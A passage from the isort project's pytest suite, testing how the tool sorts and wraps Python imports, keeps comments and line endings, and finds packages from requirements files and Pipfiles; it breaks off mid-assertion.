    """"""Test to ensure long single lines get handled correctly""""""
    output = SortImports(file_contents=""from ..views import (""
                                       "" _a,""
                                       ""_xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx as xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx)"",
                         line_length=79).output
    for line in output.split('\n'):
        assert len(line) <= 79

    output = SortImports(file_contents=""from ..views import (""
                                       "" _a,""
                                       ""_xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx as xxxxxx_xxxxxxx_xxxxxxxx_xxx_xxxxxxx)"",
                         line_length=76, combine_as_imports=True).output
    for line in output.split('\n'):
        assert len(line) <= 79


def test_import_inside_class_issue_432():
    """"""Test to ensure issue 432 is resolved and isort doesn't insert imports in the middle of classes""""""
    test_input = (""# coding=utf-8\n""
                  ""class Foo:\n""
                  ""    def bar(self):\n""
                  ""        pass\n"")
    expected_output = (""# coding=utf-8\n""
                       ""import baz\n""
                       ""\n""
                       ""\n""
                       ""class Foo:\n""
                       ""    def bar(self):\n""
                       ""        pass\n"")
    assert SortImports(file_contents=test_input, add_imports=['import baz']).output == expected_output


def test_wildcard_import_without_space_issue_496():
    """"""Test to ensure issue #496: wildcard without space, is resolved""""""
    test_input = 'from findorserver.coupon.models import*'
    expected_output = 'from findorserver.coupon.models import *\n'
    assert SortImports(file_contents=test_input).output == expected_output


def test_import_line_mangles_issues_491():
    """"""Test to ensure comment on import with parens doesn't cause issues""""""
    test_input = ('import os  # ([\n'
                  '\n'
                  'print(""hi"")\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_import_line_mangles_issues_505():
    """"""Test to ensure comment on import with parens doesn't cause issues""""""
    test_input = ('from sys import *  # (\n'
                  '\n'
                  '\n'
                  'def test():\n'
                  '    print(""Test print"")\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_import_line_mangles_issues_439():
    """"""Test to ensure comment on import with parens doesn't cause issues""""""
    test_input = ('import a  # () import\n'
                  'from b import b\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_alias_using_paren_issue_466():
    """"""Test to ensure issue #466: Alias causes slash incorrectly is resolved""""""
    test_input = 'from django.db.backends.mysql.base import DatabaseWrapper as MySQLDatabaseWrapper\n'
    expected_output = ('from django.db.backends.mysql.base import (\n'
                       '    DatabaseWrapper as MySQLDatabaseWrapper)\n')
    assert SortImports(file_contents=test_input, line_length=50, use_parentheses=True).output == expected_output

    test_input = 'from django.db.backends.mysql.base import DatabaseWrapper as MySQLDatabaseWrapper\n'
    expected_output = ('from django.db.backends.mysql.base import (\n'
                       '    DatabaseWrapper as MySQLDatabaseWrapper\n'
                       ')\n')
    assert SortImports(file_contents=test_input, line_length=50, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
                       use_parentheses=True).output == expected_output


def test_long_alias_using_paren_issue_957():
    test_input = ('from package import module as very_very_very_very_very_very_very_very_very_very_long_alias\n')
    expected_output = ('from package import (\n'
                       '    module as very_very_very_very_very_very_very_very_very_very_long_alias\n'
                       ')\n')
    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output
    assert out == expected_output

    test_input = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import module as very_very_very_very_very_very_very_very_very_very_long_alias\n')
    expected_output = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import (\n'
                       '    module as very_very_very_very_very_very_very_very_very_very_long_alias\n'
                       ')\n')
    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output
    assert out == expected_output

    test_input = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import very_very_very_very_very_very_very_very_very_very_long_module as very_very_very_very_very_very_very_very_very_very_long_alias\n')
    expected_output = ('from deep.deep.deep.deep.deep.deep.deep.deep.deep.package import (\n'
                       '    very_very_very_very_very_very_very_very_very_very_long_module as very_very_very_very_very_very_very_very_very_very_long_alias\n'
                       ')\n')
    out = SortImports(file_contents=test_input, line_length=50, use_parentheses=True, multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, check=True).output
    assert out == expected_output


def test_strict_whitespace_by_default(capsys):
    test_input = ('import os\n'
                  'from django.conf import settings\n')
    SortImports(file_contents=test_input, check=True)
    out, err = capsys.readouterr()
    assert out == 'ERROR:  Imports are incorrectly sorted.\n'


def test_strict_whitespace_no_closing_newline_issue_676(capsys):
    test_input = ('import os\n'
                  '\n'
                  'from django.conf import settings\n'
                  '\n'
                  'print(1)')
    SortImports(file_contents=test_input, check=True)
    out, err = capsys.readouterr()
    assert out == ''


def test_ignore_whitespace(capsys):
    test_input = ('import os\n'
                  'from django.conf import settings\n')
    SortImports(file_contents=test_input, check=True, ignore_whitespace=True)
    out, err = capsys.readouterr()
    assert out == ''


def test_import_wraps_with_comment_issue_471():
    """"""Test to ensure issue #471 is resolved""""""
    test_input = ('from very_long_module_name import SuperLongClassName  #@UnusedImport'
                  ' -- long string of comments which wrap over')
    expected_output = ('from very_long_module_name import (\n'
                       '    SuperLongClassName)  # @UnusedImport -- long string of comments which wrap over\n')
    assert SortImports(file_contents=test_input, line_length=50, multi_line_output=1,
                       use_parentheses=True).output == expected_output


def test_import_case_produces_inconsistent_results_issue_472():
    """"""Test to ensure sorting imports with same name but different case produces the same result across platforms""""""
    test_input = ('from sqlalchemy.dialects.postgresql import ARRAY\n'
                  'from sqlalchemy.dialects.postgresql import array\n')
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input

    test_input = 'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\n'
    assert SortImports(file_contents=test_input).output == test_input


def test_inconsistent_behavior_in_python_2_and_3_issue_479():
    """"""Test to ensure Python 2 and 3 have the same behavior""""""
    test_input = ('from future.standard_library import hooks\n'
                  'from workalendar.europe import UnitedKingdom\n')
    assert SortImports(file_contents=test_input,
                       known_first_party=[""future""]).output == test_input


def test_sort_within_section_comments_issue_436():
    """"""Test to ensure sort within sections leaves comments untouched""""""
    test_input = ('import os.path\n'
                  'import re\n'
                  '\n'
                  '# report.py exists in ... comment line 1\n'
                  '# this file needs to ...  comment line 2\n'
                  '# it must not be ...      comment line 3\n'
                  'import report\n')
    assert SortImports(file_contents=test_input, force_sort_within_sections=True).output == test_input


def test_sort_within_sections_with_force_to_top_issue_473():
    """"""Test to ensure it's possible to sort within sections with items forced to top""""""
    test_input = ('import z\n'
                  'import foo\n'
                  'from foo import bar\n')
    assert SortImports(file_contents=test_input, force_sort_within_sections=True,
                       force_to_top=['z']).output == test_input


def test_correct_number_of_new_lines_with_comment_issue_435():
    """"""Test to ensure that injecting a comment in-between imports doesn't mess up the new line spacing""""""
    test_input = ('import foo\n'
                  '\n'
                  '# comment\n'
                  '\n'
                  '\n'
                  'def baz():\n'
                  '    pass\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_future_below_encoding_issue_545():
    """"""Test to ensure future is always below comment""""""
    test_input = ('#!/usr/bin/env python\n'
                  'from __future__ import print_function\n'
                  'import logging\n'
                  '\n'
                  'print(""hello"")\n')
    expected_output = ('#!/usr/bin/env python\n'
                       'from __future__ import print_function\n'
                       '\n'
                       'import logging\n'
                       '\n'
                       'print(""hello"")\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_no_extra_lines_issue_557():
    """"""Test to ensure no extra lines are prepended""""""
    test_input = ('import os\n'
                  '\n'
                  'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\n')
    expected_output = ('import os\n'
                       'from scrapy.core.downloader.handlers.http import HttpDownloadHandler, HTTPDownloadHandler\n')
    assert SortImports(file_contents=test_input, force_alphabetical_sort=True,
                       force_sort_within_sections=True).output == expected_output


def test_long_import_wrap_support_with_mode_2():
    """"""Test to ensure mode 2 still allows wrapped imports with slash""""""
    test_input = ('from foobar.foobar.foobar.foobar import \\\n'
                  '    an_even_longer_function_name_over_80_characters\n')
    assert SortImports(file_contents=test_input, multi_line_output=WrapModes.HANGING_INDENT,
                       line_length=80).output == test_input


def test_pylint_comments_incorrectly_wrapped_issue_571():
    """"""Test to ensure pylint comments don't get wrapped""""""
    test_input = ('from PyQt5.QtCore import QRegExp  # @UnresolvedImport pylint: disable=import-error,'
                  'useless-suppression\n')
    expected_output = ('from PyQt5.QtCore import \\\n'
                       '    QRegExp  # @UnresolvedImport pylint: disable=import-error,useless-suppression\n')
    assert SortImports(file_contents=test_input, line_length=60).output == expected_output


def test_ensure_async_methods_work_issue_537():
    """"""Test to ensure async methods are correctly identified""""""
    test_input = ('from myapp import myfunction\n'
                  '\n'
                  '\n'
                  'async def test_myfunction(test_client, app):\n'
                  '    a = await myfunction(test_client, app)\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_ensure_as_imports_sort_correctly_within_from_imports_issue_590():
    """"""Test to ensure combination from and as import statements are sorted correct""""""
    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input, force_sort_within_sections=True).output == test_input

    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input).output == test_input

    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input


def test_ensure_line_endings_are_preserved_issue_493():
    """"""Test to ensure line endings are not converted""""""
    test_input = ('from os import defpath\r\n'
                  'from os import pathsep as separator\r\n')
    assert SortImports(file_contents=test_input).output == test_input
    test_input = ('from os import defpath\r'
                  'from os import pathsep as separator\r')
    assert SortImports(file_contents=test_input).output == test_input
    test_input = ('from os import defpath\n'
                  'from os import pathsep as separator\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_not_splitted_sections():
    whiteline = '\n'
    stdlib_section = 'import unittest\n'
    firstparty_section = 'from app.pkg1 import mdl1\n'
    local_section = 'from .pkg2 import mdl2\n'
    statement = 'foo = bar\n'
    test_input = (
        stdlib_section + whiteline + firstparty_section + whiteline +
        local_section + whiteline + statement
    )

    assert SortImports(file_contents=test_input).output == test_input
    assert SortImports(file_contents=test_input, no_lines_before=['LOCALFOLDER']).output == \
           (
               stdlib_section + whiteline + firstparty_section + local_section +
               whiteline + statement
           )
    # by default STDLIB and FIRSTPARTY sections are split by THIRDPARTY section,
    # so don't merge them if THIRDPARTY imports aren't exist
    assert SortImports(file_contents=test_input, no_lines_before=['FIRSTPARTY']).output == test_input
    # in case when THIRDPARTY section is excluded from sections list, it's ok to merge STDLIB and FIRSTPARTY
    assert SortImports(
        file_contents=test_input,
        sections=['STDLIB', 'FIRSTPARTY', 'LOCALFOLDER'],
        no_lines_before=['FIRSTPARTY'],
    ).output == (
        stdlib_section + firstparty_section + whiteline + local_section +
        whiteline + statement
    )
    # it doesn't change output, because stdlib packages don't have any whitelines before them
    assert SortImports(file_contents=test_input, no_lines_before=['STDLIB']).output == test_input


def test_no_lines_before_empty_section():
    test_input = ('import first\n'
                  'import custom\n')
    assert SortImports(
        file_contents=test_input,
        known_third_party=[""first""],
        known_custom=[""custom""],
        sections=['THIRDPARTY', 'LOCALFOLDER', 'CUSTOM'],
        no_lines_before=['THIRDPARTY', 'LOCALFOLDER', 'CUSTOM'],
    ).output == test_input


def test_no_inline_sort():
    """"""Test to ensure multiple `from` imports in one line are not sorted if `--no-inline-sort` flag
    is enabled. If `--force-single-line-imports` flag is enabled, then `--no-inline-sort` is ignored.""""""
    test_input = 'from foo import a, c, b\n'
    assert SortImports(file_contents=test_input, no_inline_sort=True, force_single_line=False).output == test_input
    assert SortImports(file_contents=test_input, no_inline_sort=False, force_single_line=False).output == 'from foo import a, b, c\n'
    expected = (
        'from foo import a\n'
        'from foo import b\n'
        'from foo import c\n'
    )
    assert SortImports(file_contents=test_input, no_inline_sort=False, force_single_line=True).output == expected
    assert SortImports(file_contents=test_input, no_inline_sort=True, force_single_line=True).output == expected


def test_relative_import_of_a_module():
    """"""Imports can be dynamically created (PEP302) and is used by modules such as six.  This test ensures that
    these types of imports are still sorted to the correct type instead of being categorized as local.""""""
    test_input = ('from __future__ import absolute_import\n'
                  '\n'
                  'import itertools\n'
                  '\n'
                  'from six import add_metaclass\n'
                  '\n'
                  'from six.moves import asd\n'
                  )

    expected_results = ('from __future__ import absolute_import\n'
                        '\n'
                        'import itertools\n'
                        '\n'
                        'from six import add_metaclass\n'
                        'from six.moves import asd\n'
                        )

    sorted_result = SortImports(file_contents=test_input, force_single_line=True).output
    assert sorted_result == expected_results


def test_escaped_parens_sort():
    test_input = ('from foo import \\ \n'
                  '(a,\n'
                  'b,\n'
                  'c)\n')
    expected = ('from foo import a, b, c\n')
    assert SortImports(file_contents=test_input).output == expected


def test_is_python_file_ioerror(tmpdir):
    does_not_exist = tmpdir.join('fake.txt')
    assert is_python_file(str(does_not_exist)) is False


def test_is_python_file_shebang(tmpdir):
    path = tmpdir.join('myscript')
    path.write('#!/usr/bin/env python\n')
    assert is_python_file(str(path)) is True


def test_is_python_file_editor_backup(tmpdir):
    path = tmpdir.join('myscript~')
    path.write('#!/usr/bin/env python\n')
    assert is_python_file(str(path)) is False


def test_is_python_typing_stub(tmpdir):
    stub = tmpdir.join('stub.pyi')
    assert is_python_file(str(stub)) is True


def test_to_ensure_imports_are_brought_to_top_issue_651():
    test_input = ('from __future__ import absolute_import, unicode_literals\n'
                  '\n'
                  'VAR = """"""\n'
                  'multiline text\n'
                  '""""""\n'
                  '\n'
                  'from __future__ import unicode_literals\n'
                  'from __future__ import absolute_import\n')
    expected_output = ('from __future__ import absolute_import, unicode_literals\n'
                       '\n'
                       'VAR = """"""\n'
                       'multiline text\n'
                       '""""""\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_to_ensure_importing_from_imports_module_works_issue_662():
    test_input = ('@wraps(fun)\n'
                  'def __inner(*args, **kwargs):\n'
                  '    from .imports import qualname\n'
                  '    warn(description=description or qualname(fun), deprecation=deprecation, removal=removal)\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_to_ensure_no_unexpected_changes_issue_666():
    test_input = ('from django.conf import settings\n'
                  'from django.core.management import call_command\n'
                  'from django.core.management.base import BaseCommand\n'
                  'from django.utils.translation import ugettext_lazy as _\n'
                  '\n'
                  'TEMPLATE = """"""\n'
                  '# This file is generated automatically with the management command\n'
                  '#\n'
                  '#    manage.py bis_compile_i18n\n'
                  '#\n'
                  '# please dont change it manually.\n'
                  'from django.utils.translation import ugettext_lazy as _\n'
                  '""""""\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_to_ensure_tabs_dont_become_space_issue_665():
    test_input = ('import os\n'
                  '\n'
                  '\n'
                  'def my_method():\n'
                  '\tpass\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_new_lines_are_preserved():
    with NamedTemporaryFile('w', suffix='py', delete=False) as rn_newline:
        pass

    try:
        with io.open(rn_newline.name, mode='w', newline='') as rn_newline_input:
            rn_newline_input.write('import sys\r\nimport os\r\n')

        SortImports(rn_newline.name, settings_path=os.getcwd())
        with io.open(rn_newline.name) as new_line_file:
            print(new_line_file.read())
        with io.open(rn_newline.name, newline='') as rn_newline_file:
            rn_newline_contents = rn_newline_file.read()
        assert rn_newline_contents == 'import os\r\nimport sys\r\n'
    finally:
        os.remove(rn_newline.name)

    with NamedTemporaryFile('w', suffix='py', delete=False) as r_newline:
        pass

    try:
        with io.open(r_newline.name, mode='w', newline='') as r_newline_input:
            r_newline_input.write('import sys\rimport os\r')

        SortImports(r_newline.name, settings_path=os.getcwd())
        with io.open(r_newline.name, newline='') as r_newline_file:
            r_newline_contents = r_newline_file.read()
        assert r_newline_contents == 'import os\rimport sys\r'
    finally:
        os.remove(r_newline.name)

    with NamedTemporaryFile('w', suffix='py', delete=False) as n_newline:
        pass

    try:
        with io.open(n_newline.name, mode='w', newline='') as n_newline_input:
            n_newline_input.write('import sys\nimport os\n')

        SortImports(n_newline.name, settings_path=os.getcwd())
        with io.open(n_newline.name, newline='') as n_newline_file:
            n_newline_contents = n_newline_file.read()
        assert n_newline_contents == 'import os\nimport sys\n'
    finally:
        os.remove(n_newline.name)


def test_requirements_finder(tmpdir):
    subdir = tmpdir.mkdir('subdir').join(""lol.txt"")
    subdir.write(""flask"")
    req_file = tmpdir.join('requirements.txt')
    req_file.write(
        ""Django==1.11\n""
        ""-e git+https://github.com/orsinium/deal.git#egg=deal\n""
    )
    si = SortImports(file_contents="""")
    for path in (str(tmpdir), str(subdir)):
        finder = finders.RequirementsFinder(
            config=si.config,
            sections=si.sections,
            path=path
        )

        files = list(finder._get_files())
        assert len(files) == 1  # file finding
        assert files[0].endswith('requirements.txt')  # file finding
        assert set(finder._get_names(str(req_file))) == {'Django', 'deal'}  # file parsing

        assert finder.find(""django"") == si.sections.THIRDPARTY  # package in reqs
        assert finder.find(""flask"") is None  # package not in reqs
        assert finder.find(""deal"") == si.sections.THIRDPARTY  # vcs

        assert len(finder.mapping) > 100
        assert finder._normalize_name('deal') == 'deal'
        assert finder._normalize_name('Django') == 'django'  # lowercase
        assert finder._normalize_name('django_haystack') == 'haystack'  # mapping
        assert finder._normalize_name('Flask-RESTful') == 'flask_restful'  # conver `-`to `_`

    req_file.remove()


def test_forced_separate_is_deterministic_issue_774(tmpdir):

    config_file = tmpdir.join('setup.cfg')
    config_file.write(
        ""[isort]\n""
        ""forced_separate:\n""
        ""   separate1\n""
        ""   separate2\n""
        ""   separate3\n""
        ""   separate4\n""
    )

    test_input = ('import time\n'
                  '\n'
                  'from separate1 import foo\n'
                  '\n'
                  'from separate2 import bar\n'
                  '\n'
                  'from separate3 import baz\n'
                  '\n'
                  'from separate4 import quux\n')

    assert SortImports(file_contents=test_input, settings_path=config_file.strpath).output == test_input


PIPFILE = """"""
[[source]]
url = ""https://pypi.org/simple""
verify_ssl = true
name = ""pypi""

[requires]
python_version = ""3.5""

[packages]
Django = ""~=1.11""
deal = {editable = true, git = ""https://github.com/orsinium/deal.git""}

[dev-packages]
""""""


def test_pipfile_finder(tmpdir):
    pipfile = tmpdir.join('Pipfile')
    pipfile.write(PIPFILE)
    si = SortImports(file_contents="""")
    finder = finders.PipfileFinder(
        config=si.config,
        sections=si.sections,
        path=str(tmpdir)
    )

    assert set(finder._get_names(str(tmpdir))) == {'Django', 'deal'}  # file parsing

    assert finder.find(""django"") == si.sections.THIRDPARTY  # package in reqs
    assert finder.find(""flask"") is None  # package not in reqs
    assert finder.find(""deal"") == si.sections.THIRDPARTY  # vcs

    assert len(finder.mapping) > 100
    assert finder._normalize_name('deal') == 'deal'
    assert finder._normalize_name('Django') == 'django'  # lowercase
    assert finder._normalize_name('django_haystack') == 'haystack'  # mapping
    assert finder._normalize_name('Flask-RESTful') == 'flask_restful'  # conver `-`to `_`

    pipfile.remove()


def test_monkey_patched_urllib():
    with pytest.raises(ImportError):
        # Previous versions of isort monkey patched urllib which caused unusual
        # importing for other projects.
        from urllib import quote  # type: ignore  # noqa: F401


def test_path_finder(monkeypatch):
    si = SortImports(file_contents="""")
    finder = finders.PathFinder(
        config=si.config,
        sections=si.sections,
    )
    third_party_prefix = next(path for path in finder.paths if ""site-packages"" in path)
    ext_suffix = sysconfig.get_config_var(""EXT_SUFFIX"") or "".so""
    imaginary_paths = set([
        posixpath.join(finder.stdlib_lib_prefix, ""example_1.py""),
        posixpath.join(third_party_prefix, ""example_2.py""),
        posixpath.join(third_party_prefix, ""example_3.so""),
        posixpath.join(third_party_prefix, ""example_4"" + ext_suffix),
        posixpath.join(os.getcwd(), ""example_5.py""),
    ])
    monkeypatch.setattr(""isort.finders.exists_case_sensitive"", lambda p: p in imaginary_paths)
    assert finder.find(""example_1"") == finder.sections.STDLIB
    assert finder.find(""example_2"") == finder.sections.THIRDPARTY
    assert finder.find(""example_3"") == finder.sections.THIRDPARTY
    assert finder.find(""example_4"") == finder.sections.THIRDPARTY
    assert finder.find(""example_5"") == finder.sections.FIRSTPARTY


def test_argument_parsing():
    from isort.main import parse_args
    args = parse_args(['-dt', '-t', 'foo', '--skip=bar', 'baz.py'])
    assert args['order_by_type'] is False
    assert args['force_to_top'] == ['foo']
    assert args['skip'] == ['bar']
    assert args['files'] == ['baz.py']


@pytest.mark.parametrize('multiprocess', (False, True))
def test_command_line(tmpdir, capfd, multiprocess):
    from isort.main import main
    tmpdir.join(""file1.py"").write(""import re\nimport os\n\nimport contextlib\n\n\nimport isort"")
    tmpdir.join(""file2.py"").write(""import collections\nimport time\n\nimport abc\n\n\nimport isort"")
    arguments = [""-rc"", str(tmpdir), '--settings-path', os.getcwd()]
    if multiprocess:
        arguments.extend(['--jobs', '2'])
    main(arguments)
    assert tmpdir.join(""file1.py"").read() == ""import contextlib\nimport os\nimport re\n\nimport isort\n""
    assert tmpdir.join(""file2.py"").read() == ""import abc\nimport collections\nimport time\n\nimport isort\n""
    if not sys.platform.startswith('win'):
        out, err = capfd.readouterr()
        assert not err
        # it informs us about fixing the files:
        assert str(tmpdir.join(""file1.py"")) in out
        assert str(tmpdir.join(""file2.py"")) in out


@pytest.mark.parametrize(""quiet"", (False, True))
def test_quiet(tmpdir, capfd, quiet):
    if sys.platform.startswith(""win""):
        return
    from isort.main import main
    tmpdir.join(""file1.py"").write(""import re\nimport os"")
    tmpdir.join(""file2.py"").write("""")
    arguments = [""-rc"", str(tmpdir)]
    if quiet:
        arguments.append(""-q"")
    main(arguments)
    out, err = capfd.readouterr()
    assert not err
    assert bool(out) != quiet


@pytest.mark.parametrize('enabled', (False, True))
def test_safety_excludes(tmpdir, enabled):
    tmpdir.join(""victim.py"").write(""# ..."")
    toxdir = tmpdir.mkdir("".tox"")
    toxdir.join(""verysafe.py"").write(""# ..."")
    tmpdir.mkdir(""lib"").mkdir(""python3.7"").join(""importantsystemlibrary.py"").write(""# ..."")
    tmpdir.mkdir("".pants.d"").join(""pants.py"").write(""import os"")
    config = dict(settings.default.copy(), safety_excludes=enabled)
    skipped = []  # type: List[str]
    codes = [str(tmpdir)]
    main.iter_source_code(codes, config, skipped)

    # if enabled files within nested unsafe directories should be skipped
    file_names = set(os.path.relpath(f, str(tmpdir)) for f in main.iter_source_code([str(tmpdir)], config, skipped))
    if enabled:
        assert file_names == {'victim.py'}
        assert len(skipped) == 3
    else:
        assert file_names == {os.sep.join(('.tox', 'verysafe.py')),
                              os.sep.join(('lib', 'python3.7', 'importantsystemlibrary.py')),
                              os.sep.join(('.pants.d', 'pants.py')),
                              'victim.py'}
        assert not skipped

    # directly pointing to files within unsafe directories shouldn't skip them either way
    file_names = set(os.path.relpath(f, str(toxdir)) for f in main.iter_source_code([str(toxdir)], config, skipped))
    assert file_names == {'verysafe.py'}


@pytest.mark.parametrize('skip_glob_assert', (([], 0, {os.sep.join(('code', 'file.py'))}), (['**/*.py'], 1, {}),
                                              (['*/code/*.py'], 1, {})))
def test_skip_glob(tmpdir, skip_glob_assert):
    skip_glob, skipped_count, file_names = skip_glob_assert
    base_dir = tmpdir.mkdir('build')
    code_dir = base_dir.mkdir('code')
    code_dir.join('file.py').write('import os')

    config = dict(settings.default.copy(), skip_glob=skip_glob)
    skipped = []  # type: List[str]
    file_names = set(os.path.relpath(f, str(base_dir)) for f in main.iter_source_code([str(base_dir)], config, skipped))
    assert len(skipped) == skipped_count
    assert file_names == file_names


def test_comments_not_removed_issue_576():
    test_input = ('import distutils\n'
                  '# this comment is important and should not be removed\n'
                  'from sys import api_version as api_version\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_reverse_relative_imports_issue_417():
    test_input = ('from . import ipsum\n'
                  'from . import lorem\n'
                  'from .dolor import consecteur\n'
                  'from .sit import apidiscing\n'
                  'from .. import donec\n'
                  'from .. import euismod\n'
                  'from ..mi import iaculis\n'
                  'from ..nec import tempor\n'
                  'from ... import diam\n'
                  'from ... import dui\n'
                  'from ...eu import dignissim\n'
                  'from ...ex import metus\n')
    assert SortImports(file_contents=test_input,
                       force_single_line=True,
                       reverse_relative=True).output == test_input


def test_inconsistent_relative_imports_issue_577():
    test_input = ('from ... import diam\n'
                  'from ... import dui\n'
                  'from ...eu import dignissim\n'
                  'from ...ex import metus\n'
                  'from .. import donec\n'
                  'from .. import euismod\n'
                  'from ..mi import iaculis\n'
                  'from ..nec import tempor\n'
                  'from . import ipsum\n'
                  'from . import lorem\n'
                  'from .dolor import consecteur\n'
                  'from .sit import apidiscing\n')
    assert SortImports(file_contents=test_input, force_single_line=True).output == test_input


def test_unwrap_issue_762():
    test_input = ('from os.path \\\n'
                  'import (join, split)\n')
    assert SortImports(file_contents=test_input).output == 'from os.path import join, split\n'

    test_input = ('from os.\\\n'
                  '    path import (join, split)')
    assert SortImports(file_contents=test_input).output == 'from os.path import join, split\n'


def test_multiple_as_imports():
    test_input = ('from a import b as b\n'
                  'from a import b as bb\n'
                  'from a import b as bb_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output
    assert test_output == 'from a import b as b, b as bb, b as bb_\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b as b, b as bb, b as bb_\n'

    test_input = ('from a import b\n'
                  'from a import b as b\n'
                  'from a import b as bb\n'
                  'from a import b as bb_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == 'from a import b as b\nfrom a import b as bb\nfrom a import b as bb_\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output
    assert test_output == 'from a import b as b, b as bb, b as bb_\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b, b as b, b as bb, b as bb_\n'

    test_input = ('from a import b as e\n'
                  'from a import b as c\n'
                  'from a import b\n'
                  'from a import b as f\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == 'from a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True).output
    assert test_output == 'from a import b as c, b as e, b as f\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b\nfrom a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, no_inline_sort=True).output
    assert test_output == 'from a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, keep_direct_and_as_imports=True, no_inline_sort=True).output
    assert test_output == 'from a import b\nfrom a import b as c\nfrom a import b as e\nfrom a import b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == 'from a import b, b as c, b as e, b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, no_inline_sort=True).output
    assert test_output == 'from a import b as e, b as c, b as f\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True, no_inline_sort=True).output
    assert test_output == 'from a import b, b as e, b as c, b as f\n'

    test_input = ('import a as a\n'
                  'import a as aa\n'
                  'import a as aa_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == test_input
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == test_input

    test_input = ('import a\n'
                  'import a as a\n'
                  'import a as aa\n'
                  'import a as aa_\n')
    test_output = SortImports(file_contents=test_input).output
    assert test_output == 'import a as a\nimport a as aa\nimport a as aa_\n'
    test_output = SortImports(file_contents=test_input, combine_as_imports=True, keep_direct_and_as_imports=True).output
    assert test_output == test_input


def test_all_imports_from_single_module():
    test_input = ('import a\n'
                  'from a import *\n'
                  'from a import b as d\n'
                  'from a import z, x, y\n'
                  'from a import b\n'
                  'from a import w, i as j\n'
                  'from a import b as c, g as h\n'
                  'from a import e as f\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=True, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == 'import a\nfrom a import *\n'
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=True,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c, b as d, e as f, g as h, i as j, w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=True, force_single_line=False, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w, x, y, z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=True, no_inline_sort=False).output
    assert test_output == ('import a\n'
                           'from a import *\n'
                           'from a import b as c\n'
                           'from a import b as d\n'
                           'from a import e as f\n'
                           'from a import g as h\n'
                           'from a import i as j\n'
                           'from a import w\n'
                           'from a import x\n'
                           'from a import y\n'
                           'from a import z\n')
    test_output = SortImports(file_contents=test_input, combine_star=False, combine_as_imports=False,
                              keep_direct_and_as_imports=False, force_single_line=False, no_inline_sort=True).output
    assert test_output == ('import a\n'
                           'from a import *\n'
